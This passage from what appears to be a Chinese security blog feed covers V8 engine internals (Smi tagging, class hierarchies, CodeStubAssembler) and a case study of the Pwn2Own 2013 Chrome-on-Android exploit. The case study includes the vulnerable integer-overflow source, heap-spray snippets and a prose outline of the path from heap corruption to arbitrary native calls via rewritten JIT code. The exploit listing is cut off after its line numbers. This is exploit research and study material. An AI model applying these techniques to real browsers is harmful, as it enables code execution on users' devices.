&#123;</span><br><span class="line">      <span class="keyword">case</span> Map::JS_OBJECT:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"JSObject =&gt; %c\n"</span>, o-&gt;value());</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> Map::JS_ARRAY:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"JSArray =&gt; %c\n"</span>, o-&gt;value());</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> Map::JS_STRING:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"JSString =&gt; %c\n"</span>, o-&gt;value());</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">    objects[i]-&gt;Free();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>执行时，输出JSObject =&gt; o，JSArray =&gt; a，JSString =&gt; s。<br>我认为这个例子有点长，但我认为你可以看到：你可以正确地分配分配给堆的对象类型。<br>让我们解释一下Smi正在做些什么。</p><h3 id="Smi"><a href="#Smi" class="headerlink" title="Smi"></a>Smi</h3><p>Smi是Small Integer的缩写，可以直接在指针区域中保存最多31位的整数。<br>似乎Ruby中也采用了相同的方法。<br>对于普通指针，32位CPU使用4个字节,64位CPU使用8个字节。<br>换句话说，如果它是一个高达31位的整数，则可以存储它而不是使用指针。<br>以这种方式，通过将其固定在指针区域中而不使用堆，实现了存储器节省和加速。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Smi</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">static</span> Smi* <span class="title">FromInt</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;Smi*&gt;(value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">value</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">intptr_t</span>&gt;(<span class="keyword">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">Smi* <span class="title">NewSmi</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> Smi::FromInt(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%d %d\n"</span>, NewSmi(<span class="number">120</span>)-&gt;value(), NewSmi(<span class="number">110</span>)-&gt;value());</span><br><span class="line">  <span class="comment">// out 120 110</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外，在v8::i::HeapObject的情况下，设置低位为1，但在Smi的情况下，结尾用0作标记，<br>通过cast可以直接进行数值计算。 因此，没有开销。<br>在64位CPU的情况下，由于指针是64位，因此可以存储更大的整数，但是为了与32位兼容，仅使用31位区域。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-07-09-172242.png" alt=""></p><h3 id="JSReceiver"><a href="#JSReceiver" class="headerlink" title="JSReceiver"></a>JSReceiver</h3><ul><li>JSArray</li><li>JSArrayBuffer</li><li>JSArrayBufferView<ul><li>JSTypedArray</li><li>JSDataView</li></ul></li><li>JSBoundFunction</li><li>JSCollection<ul><li>JSSet</li><li>JSMap</li></ul></li><li>JSStringIterator</li><li>JSSetIterator</li><li>JSMapIterator</li><li>JSWeakCollection<ul><li>JSWeakMap</li><li>JSWeakSet</li></ul></li><li>JSRegExp</li><li>JSFunction</li><li>JSGeneratorObject</li><li>JSGlobalObject</li><li>JSGlobalProxy</li><li>JSValue<ul><li>JSDate</li></ul></li><li>JSMessageObject</li><li>JSModuleNamespace</li><li>WasmInstanceObject</li><li>WasmMemoryObject</li><li>WasmModuleObject</li><li>WasmTableObject</li></ul><p>这些v8::i::JS~类是类的真实形式，例如v8::String和v8::Array通过API使用它们。<br>诸如v8::String之类的类只是wrapper类。<br>所有实际的实现都是v8::i::JS~类。</p><h3 id="FixedArrayBase"><a href="#FixedArrayBase" class="headerlink" title="FixedArrayBase"></a>FixedArrayBase</h3><p>v8::i::FixedArray的基本实现，它是v8中的常用类。<br>v8在里面到处都在使用这个固定长度的数组，v8::i::FixedArray有以下层次结构。</p><ul><li>DescriptorArray</li><li>FrameArray</li><li>HashTable<ul><li>Dictionary</li><li>StringTable</li><li>StringSet</li><li>CompilationCacheTable</li><li>MapCache</li></ul></li><li>OrderedHashTable<ul><li>OrderedHashSet</li><li>OrderedHashMap</li></ul></li><li>Context</li><li>FeedbackMetadata</li><li>TemplateList</li><li>TransitionArray</li><li>ScopeInfo</li><li>ModuleInfo</li><li>ScriptContextTable</li><li>WeakFixedArray</li><li>WasmSharedModuleData</li><li>WasmCompiledModule</li></ul><p>特别的，v8::i::DescriptorArray是一个存储属性描述符的数组。</p><h3 id="CodeStubAssembler-CSA"><a href="#CodeStubAssembler-CSA" class="headerlink" title="CodeStubAssembler (CSA)"></a>CodeStubAssembler (CSA)</h3><p>在v8中使用的DSL语言。<br>实际上，在v8中，编写汇编语言并不是什么新鲜事。<br>相反，通过描述可以输出汇编的CSA，可以输出具有更高<strong>可维护性</strong>的<strong>高速</strong>代码。<br>CSA的一个例子如下所示。<br>计算Fibonacci数,并将其存储在数组中.<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fibonacci</span>(<span class="params">num</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">1</span>, b = <span class="number">0</span>, temp;</span><br><span class="line">  <span class="keyword">const</span> result = [];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (num &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">    result.push(a);</span><br><span class="line">    temp = a;</span><br><span class="line">    a = a + b;</span><br><span class="line">    b = temp;</span><br><span class="line">    num--;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>将javascript函数转换为CSA时，它将成为以下代码。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">TNode&lt;JSArray&gt; Fibonacci(TNode&lt;Context&gt; context) &#123;</span><br><span class="line">  TVARIABLE(var_a, MachineType::PointerRepresentation(), IntPtrConstant(<span class="number">0</span>));</span><br><span class="line">  TVARIABLE(var_b, MachineType::PointerRepresentation(), IntPtrConstant(<span class="number">1</span>));</span><br><span class="line">  TVARIABLE(var_temp, MachineType::PointerRepresentation());</span><br><span class="line">  TVARIABLE(var_index, MachineType::PointerRepresentation());</span><br><span class="line"></span><br><span class="line">  Node* fixed_array = AllocateFixedArray(PACKED_ELEMENTS, IntPtrConstant(<span class="number">11</span>),</span><br><span class="line">                           INTPTR_PARAMETERS, kAllowLargeObjectAllocation)</span><br><span class="line"></span><br><span class="line">  Label loop(<span class="keyword">this</span>), after_loop(<span class="keyword">this</span>);</span><br><span class="line"></span><br><span class="line">  Branch(IntPtrGreaterThan(IntPtrConstant(<span class="number">100</span>), var_index), &amp;loop, &amp;after_loop);</span><br><span class="line">  BIND(&amp;loop);</span><br><span class="line">  &#123;</span><br><span class="line">    StoreFixedArrayElement(fixed_array, SmiTag(var_index), var_a,</span><br><span class="line">                           SKIP_WRITE_BARRIER);</span><br><span class="line">    var_temp.Bind(var_a);</span><br><span class="line">    var_a.Bind(IntPtrAdd(var_a, var_b));</span><br><span class="line">    var_b.Bind(var_temp);</span><br><span class="line">    Increment(&amp;var_index, <span class="number">1</span>);</span><br><span class="line">    Branch(IntPtrGreaterThan(IntPtrConstant(<span class="number">100</span>), var_index),</span><br><span class="line">           &amp;loop, &amp;after_loop);</span><br><span class="line">  &#125;</span><br><span class="line">  BIND(&amp;after_loop);</span><br><span class="line">  Node* native_context = LoadNativeContext(context);</span><br><span class="line">  Node* array_map = LoadJSArrayElementsMap(PACKED_ELEMENTS, native_context);</span><br><span class="line">  Node* <span class="built_in">array</span> = AllocateUninitializedJSArrayWithoutElements(</span><br><span class="line">      array_map, SmiConstant(<span class="number">12</span>), <span class="literal">nullptr</span>);</span><br><span class="line">  StoreObjectField(<span class="built_in">array</span>, JSArray::kElementsOffset, fixed_array);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">array</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>尽管它在某种程度上是抽象的，并且有很多冗余代码，但是它不是比汇编更容易阅读吗？</p><h2 id="阅读代码"><a href="#阅读代码" class="headerlink" title="阅读代码"></a>阅读代码</h2><p>阅读v8代码非常麻烦，但有几种方法。</p><p>首先，使用每个IDE的代码跳转。<br>但是，由于v8使用了大量的宏，甚至即使是类的函数定义也可能由宏执行，因此最好在找不到时使用find | grep。</p><p>即使您阅读了代码，您可能也不知道执行时的状态，或者您可能不知道调用的层次结构，因此您应该在调试时按以下方式检查它。</p><ul><li>c++<br>由于src/base/debug/stack_trace.h中有一个StackTrace类，所以最好在要的点调用StackTrace st; st.Print()。<br>此外，由于继承v8::Object类的对象始终具有Print方法，因此可以通过调用 -&gt;Print()来查看内容。</li><li>CSA<br>由于Print()函数是在CodeStubAssembler中定义的，我们在那里传递Node *并输出执行a-&gt; Print()的代码。<br>但是，要小心，因为传递IntPtrT会失败。 在这种情况下，你可以做SmiTag。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;v8代码组成&quot;&gt;&lt;a href=&quot;#v8代码组成&quot; class=&quot;headerlink&quot; title=&quot;v8代码组成&quot;&gt;&lt;/a&gt;v8代码组成&lt;/h2&gt;&lt;h3 id=&quot;目录结构概要&quot;&gt;&lt;a href=&quot;#目录结构概要&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="v8" scheme="http://eternalsakura13.com/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>case study:Mobile PWN2OWN Autumn 2013 - Chrome on Android - Exploit Writeup</title>
    <link href="http://eternalsakura13.com/2018/07/05/p2o_2013/"/>
    <id>http://eternalsakura13.com/2018/07/05/p2o_2013/</id>
    <published>2018-07-05T06:37:50.936Z</published>
    <updated>2018-07-06T05:51:41.867Z</updated>
    
    <content type="html"><![CDATA[<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://docs.google.com/document/d/1tHElG04AJR5OR2Ex-m_Jsmc8S5fAbRB3s4RmTG_PFnw/edit" target="_blank" rel="noopener">https://docs.google.com/document/d/1tHElG04AJR5OR2Ex-m_Jsmc8S5fAbRB3s4RmTG_PFnw/edit</a><br><a href="http://cygx.mydns.jp/blog/?arti=527" target="_blank" rel="noopener">http://cygx.mydns.jp/blog/?arti=527</a></p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>从exploit的角度来看，它们都不是那么重要，但是最好从源码上了解</p><ul><li>Handle/HandleScope</li><li>Context</li><li>Isolate</li><li>Platform</li><li>Interpreter</li><li>blob</li><li>ICU</li><li>third_party</li><li>tools</li></ul><p>参考资料：<a href="https://github.com/v8/v8/wiki/Embedder&#39;s-Guide" target="_blank" rel="noopener">https://github.com/v8/v8/wiki/Embedder&#39;s-Guide</a></p><h3 id="Handle-HandleScope"><a href="#Handle-HandleScope" class="headerlink" title="Handle/HandleScope"></a>Handle/HandleScope</h3><ul><li>Handle<ul><li>要启用GC跟踪，指针包装类型<ul><li>为了对应任何类型的指针，请使用C++模板</li><li>在源代码中，所有Object都使用此Handle<t>类型进行管理</t></li><li>GC有可能移动Object的位置<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-10-124518.png" alt=""><br>即使GC移动该Object，由于handle不移动，所以没有不一致</li></ul></li><li>常用Handle<ul><li>Handle<t><ul><li>Abstract class</li></ul></t></li><li>Local<t><ul><li>Temporary Handle, 保留在stack上</li><li><strong>使用后面将介绍的HandleScope进行生命周期管理</strong></li></ul></t></li><li>MaybeLocal<t><ul><li>它与Local<t>相同，但在使用前检查它是否为空</t></li></ul></t></li><li>Persistent<t><ul><li>一个persistent Handle,保留在heap上</li><li>代码编写器使用Persistent::Reset（）管理生命周期</li></ul></t></li></ul></li></ul></li><li>HandleScope<ul><li>handle总结<ul><li>Temporary Handle such as Local <t>, MaybeLocal<t></t></t></li><li>在声明HandleScope时，块中的每个handle都会自动关联</li></ul></li><li><strong>当HandleScope超出范围时，它会处理释放handle</strong><ul><li>返回函数时，结束{}时，等</li><li>用所有使用的handle来描述释放处理是低效的</li><li>使用HandleScope的析构函数，GC负责实际的释放处理</li></ul></li><li>参考以下的文件<ul><li>include/v8.h，src/handles.h</li></ul></li></ul></li></ul><h3 id="Context"><a href="#Context" class="headerlink" title="Context"></a>Context</h3><ul><li>在一个V8实例中创建多个执行环境的机制<ul><li>您可以在一个线程中同时运行彼此独立的JavaScript代码</li></ul></li><li>每个Context对象都有一个全局的Root-Object</li></ul><p><img src="http://onc55v8te.bkt.clouddn.com/2018-05-10-132114.png" alt=""><br>左边：每个context都有一个Root-Object，并且彼此独立（在本例中，context是嵌套的，但Root-Object正确切换）<br>右边：总之，它实现了环境的切换。 我们希望分别通过window，iframe和extended script来独立保护环境。所谓的origin也是在Context中定义的，并且从一个Context到另一个Context的访问不能被默认完成。</p><h3 id="Isolate"><a href="#Isolate" class="headerlink" title="Isolate"></a>Isolate</h3><ul><li>Instance of V8 itself<ul><li>context是在同一个instance中实现不同的执行环境</li><li>当你想运行自己的多个instance时使用Isolate<ul><li>为了适应多线程</li></ul></li></ul></li></ul><p><img src="http://onc55v8te.bkt.clouddn.com/2018-05-10-133452.png" alt=""></p><h3 id="Platform"><a href="#Platform" class="headerlink" title="Platform"></a>Platform</h3><ul><li>It seems to define the operating environment (it seems)<ul><li>线程相关<ul><li>决定后台线程和前台线程</li><li>管理线程池</li></ul></li><li>任务队列管理</li><li>事件追踪</li></ul></li></ul><h2 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">[src/v8/src/runtime.cc]</span><br><span class="line">RUNTIME_FUNCTION(MaybeObject*, Runtime_TypedArrayInitializeFromArrayLike)</span><br><span class="line">...</span><br><span class="line">  <span class="keyword">size_t</span> byte_length = length * element_size;<span class="comment">//integer overflow</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (byte_length &lt; length) &#123;</span><br><span class="line">    <span class="keyword">return</span> isolate-&gt;Throw(*isolate-&gt;factory()-&gt;</span><br><span class="line">      NewRangeError(<span class="string">"invalid_array_buffer_length"</span>,</span><br><span class="line">      HandleVector&lt;Object&gt;(<span class="literal">NULL</span>, <span class="number">0</span>)));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!Runtime::SetupArrayBufferAllocatingData(</span><br><span class="line">        isolate, buffer, byte_length, <span class="literal">false</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> isolate-&gt;Throw(*isolate-&gt;factory()-&gt;</span><br><span class="line">          NewRangeError(<span class="string">"invalid_array_buffer_length"</span>,</span><br><span class="line">            HandleVector&lt;Object&gt;(<span class="literal">NULL</span>, <span class="number">0</span>)));</span><br><span class="line">  &#125;<span class="comment">//The overflowed byte_length is passed to Runtime::SetupArrayBufferAllocatingData</span></span><br><span class="line">  <span class="comment">// which allocates the undersized buffer and initialises a V8 JSArrayBuffer object to point to it.</span></span><br><span class="line"></span><br><span class="line">  holder-&gt;set_buffer(*buffer);</span><br><span class="line">  holder-&gt;set_byte_offset(Smi::FromInt(<span class="number">0</span>));</span><br><span class="line">  Handle&lt;Object&gt; byte_length_obj(</span><br><span class="line">      isolate-&gt;factory()-&gt;NewNumberFromSize(byte_length));</span><br><span class="line">  holder-&gt;set_byte_length(*byte_length_obj);</span><br><span class="line">  holder-&gt;set_length(*length_obj);</span><br><span class="line">  holder-&gt;set_weak_next(buffer-&gt;weak_first_view());</span><br><span class="line">  buffer-&gt;set_weak_first_view(*holder);</span><br><span class="line"></span><br><span class="line">  Handle&lt;ExternalArray&gt; elements =</span><br><span class="line">      isolate-&gt;factory()-&gt;NewExternalArray(</span><br><span class="line">          <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(length), array_type,</span><br><span class="line">          <span class="keyword">static_cast</span>&lt;<span class="keyword">uint8_t</span>*&gt;(buffer-&gt;backing_store()));</span><br><span class="line">  holder-&gt;set_elements(*elements);</span><br><span class="line">  <span class="comment">//This JSArrayBuffer is then pointed to by a JSTypedArray for the Float64 </span></span><br><span class="line">  <span class="comment">//type which uses the original length property of the arrayLike object (which is in 8 byte units,</span></span><br><span class="line">  <span class="comment">// not bytes) to create an ExternalArray that will actually be used to manipulate the </span></span><br><span class="line">  <span class="comment">//underlying ArrayBuffer memory from javascript.</span></span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ArrayBuffer* V8ArrayBuffer::toNative(v8::Handle&lt;v8::Object&gt; object)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">    v8::ArrayBuffer::Contents v8Contents = v8buffer-&gt;Externalize();</span><br><span class="line"></span><br><span class="line">    ArrayBufferContents contents(v8Contents.Data(), v8Contents.ByteLength(),</span><br><span class="line">        V8ArrayBufferDeallocationObserver::instanceTemplate());</span><br><span class="line"></span><br><span class="line">    RefPtr&lt;ArrayBuffer&gt; buffer = ArrayBuffer::create(contents);</span><br><span class="line"></span><br><span class="line">    V8DOMWrapper::associateObjectWithWrapper&lt;V8ArrayBuffer&gt;(buffer.release(), &amp;wrapperTypeInfo, object, v8::Isolate::GetCurrent(), WrapperConfiguration::Dependent);</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">bufferData1Method</span><span class="params">(<span class="keyword">const</span> v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...</span><br><span class="line">    V8TRYCATCH_VOID(ArrayBuffer*, data, info[<span class="number">1</span>]-&gt;IsArrayBuffer() ? V8ArrayBuffer::toNative(v8::Handle&lt;v8::ArrayBuffer&gt;::Cast(info[<span class="number">1</span>])) : <span class="number">0</span>);</span><br><span class="line">...</span><br><span class="line">    imp-&gt;bufferData(target, data, usage);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="回调"><a href="#回调" class="headerlink" title="回调"></a>回调</h2><p><code>obj.__defineGetter__(property, func)</code><br>The square bracket array syntax (eg: foo[1]) when applied to regular javascript objects is also just reading a property, even if the property is a number this will still invoke a getter if one has been defined.</p><h2 id="需要调试的"><a href="#需要调试的" class="headerlink" title="需要调试的"></a>需要调试的</h2><p>backing store</p><ul><li><p>Uint8<br>meta 0x13381<br><img src="http://onc55v8te.bkt.clouddn.com/2018-07-06-024853.png" alt=""></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> t_arr=<span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="number">0x13370</span>);</span><br><span class="line">t_arr[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">t_arr[<span class="number">1</span>]=<span class="number">2</span>;</span><br><span class="line">t_arr[<span class="number">2</span>]=<span class="number">3</span>;</span><br><span class="line">t_arr[<span class="number">3</span>]=<span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">%DebugPrint(t_arr)</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure></li><li><p>Float64<br><img src="http://onc55v8te.bkt.clouddn.com/2018-07-06-024759.png" alt=""><br>meta 0x9a002<br><img src="http://onc55v8te.bkt.clouddn.com/2018-07-06-024821.png" alt=""></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> t_arr=<span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="number">0x13370</span>);</span><br><span class="line">t_arr[<span class="number">0</span>]=<span class="number">1.0</span>;</span><br><span class="line">t_arr[<span class="number">1</span>]=<span class="number">2.0</span>;</span><br><span class="line">t_arr[<span class="number">2</span>]=<span class="number">3.0</span>;</span><br><span class="line">t_arr[<span class="number">3</span>]=<span class="number">4.0</span>;</span><br><span class="line"></span><br><span class="line">%DebugPrint(t_arr)</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure></li></ul><p>其他需要调试的<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">initialOverwrite</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> arrays = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">300</span>);</span><br><span class="line">    <span class="keyword">var</span> arraysI = <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">createArray</span>(<span class="params">byteSize, num</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(byteSize);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; byteSize; i++) &#123;</span><br><span class="line">            a[i] = <span class="number">0x42</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        arrays[arraysI++] = a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arrays.length; i++) &#123;</span><br><span class="line">    createArray(<span class="number">0x20000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>思路，调试到backstore，看一下页分布？</p><h2 id="log"><a href="#log" class="headerlink" title="log"></a>log</h2><ol><li>因为我们知道如果相乘溢出，它会溢出到数组长度以下，有没有问题？<br>曾经有一段时间我这么认为。但是，在某些情况下它会溢出，但是绕过判断。<br>例如，0x24924924(length) float64（8字节）在32位环境中受到保护。<br>然后byte_length溢出，byte_length = 0x24924924 * 8 = 0x124924928 -&gt; 0x24924928<br>但在32位环境中它不满足byte_length &lt; length,并将通过检查。</li></ol><ol><li><p>修改大小并free chunk(j)之后用WTF::ArrayBuffer占位<br><img src="http://onc55v8te.bkt.clouddn.com/2018-07-06-024535.png" alt=""></p></li><li><p>all the ArrayBuffer structures we’ve seen up until now (apart from the actual backing buffer) have been in the V8 GC heap whereas the memory corruption is happening in the dlmalloc heap.</p></li><li><p>Well, from here on, we prepare to execute arbitrary code (prepareForCalls).<br>We also make WTF :: DataView and read its vtbl. Then, since you know the position of .text, search for gadget (code fragment) calling dlsym from there. Follow PLT (Procedure Linkage Table) and load the thread_data<em>table</em> pointer of v8. Then you follow the structure and you will know the position of JS’s heap. There is also rwx JITed code storage. Then eval the function that generates dummy findable code, find the JIT machine code, and rewrite it to trampoline. Trampoline is a piece of code that calls a function by writing the value written in callbuf back to the register so that you can call any native function or systemcall with arbitrary argument using the function on JS! The attacker could now completely control the inside of the sandbox.</p></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span 